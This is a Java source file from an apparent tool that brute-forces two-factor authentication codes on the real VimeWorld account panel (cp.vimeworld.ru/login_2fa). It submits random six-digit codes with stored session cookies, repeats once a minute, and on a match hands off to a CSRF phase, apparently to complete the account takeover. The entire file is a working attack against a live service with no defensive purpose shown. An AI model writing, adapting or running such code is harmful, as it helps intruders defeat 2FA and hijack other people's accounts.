package implario.vimeworld._2fa.phase;

import clepto.vk.proxy.QueryContext;
import implario.vimeworld._2fa.Account;
import implario.vimeworld._2fa.App;
import implario.vimeworld._2fa.VimeWorld2FA;
import io.mikael.urlbuilder.UrlBuilder;
import lombok.Setter;

import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Files;
import java.util.Optional;
import java.util.concurrent.ThreadLocalRandom;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class GuessPhase extends Phase {

	public static final Pattern loginValidPatern = Pattern.compile("<div class=\"wrap\">(.*)<div class=\"form-signin-heading\">");
	public static final Pattern loginResultPatern = Pattern.compile("</button>(.*)</div>");
	public static final URI methodUri = UrlBuilder.fromString("https://cp.vimeworld.ru/login_2fa").toUri();

	private long lastSuccessfulAttempt;

	@Setter
	private String currentCode = "666666";

	public GuessPhase(App app, Account account) {
		super("generate-2fa", app, account);
	}

	@Override
	public void tick0() throws Exception {

		String attemptResponse = this.tryCurrentCode();

		if (attemptResponse.equals("index")) {
			this.account.setPhase(new CsrfPhase(this.app, this.account, this.currentCode));
			this.account.getPhase().tick();
		} else if (attemptResponse.contains("login?return=")) {
			this.account.setPhase(new WaitingPhase(this.app, this.account));
			this.account.setPhpsessid(null);
			this.app.saveAccounts();
		} else {
			this.account.setTriedCodes(this.account.getTriedCodes() + 1);
			this.nextTickAfter(60_000);
		}

		this.currentCode = VimeWorld2FA.pad2faCode(ThreadLocalRandom.current().nextInt(1_000_000));



		checkLastAttemptResult(app, account, methodUri);

	}

	private String tryCurrentCode() throws IOException, InterruptedException {
		HttpRequest.Builder builder = HttpRequest.newBuilder(methodUri);
		new QueryContext()
				.body("totp", this.currentCode)
				.body("continue", "Продолжить")
				.applyBody(builder);
		app.applyVimeWorldData(builder, account);

		HttpResponse<String> response = app.getHttpClient().send(builder.build(), HttpResponse.BodyHandlers.ofString());
		long time = System.currentTimeMillis();
		if (response.statusCode() != 302) {
			app.getMainLogger().warning("Guess attempt for " + account + ", HTTP-response " + response.statusCode() +
					", tried code: " + this.currentCode +
					", " + (time - this.lastSuccessfulAttempt) + " ms. since last attempt");
		}

		Optional<String> redirected = response.headers().firstValue("location");
		if (redirected.isEmpty()) throw new RuntimeException("No location header!");

		this.lastSuccessfulAttempt = time;
		return redirected.get();
	}

	public static void checkLastAttemptResult(App app, Account account, URI uri) throws IOException, InterruptedException {
		HttpRequest request = app.applyVimeWorldData(HttpRequest.newBuilder(uri), account).build();
		HttpResponse<byte[]> response = app.getHttpClient().send(request, HttpResponse.BodyHandlers.ofByteArray());

		Files.write(new File("res-default").toPath(), response.body());

		String s = new String(response.body()).replaceAll("[\r\n]", "");

		Matcher validityMatcher = loginValidPatern.matcher(s);
		if (!validityMatcher.find()) {
			// The checking part isn't that important, we can just ignore all the 503's and other errors.
			// throw new RuntimeException("Invalid response from login page: " + s);
			return;
		}
		String resultHtml = validityMatcher.group(1);
		Matcher resultMatcher = loginResultPatern.matcher(resultHtml);
		if (resultMatcher.find()) {

			String result = resultMatcher.group(1);//.replaceAll("[^А-Яа-яЁё]+", "");
			long time = System.currentTimeMillis();
			app.getMainLogger().info(account + " result: " + result);
			//			String comment = this.lastSuccessfulAttempt == 0 ? "no successful attempts before" :
			//					time - this.lastSuccessfulAttempt + "ms. since last successful attempt";
			//			System.out.println(this.currentCode + ": " + result + ", length: " + result.length() + " (" + comment + ")");
			//			if (result.length() > 90) this.lastSuccessfulAttempt = time;
		} else {
			// The checking part isn't that important, we can just ignore all the 503's and other errors.
			// throw new RuntimeException("Invalid login result: " + resultHtml);
		}
	}

}
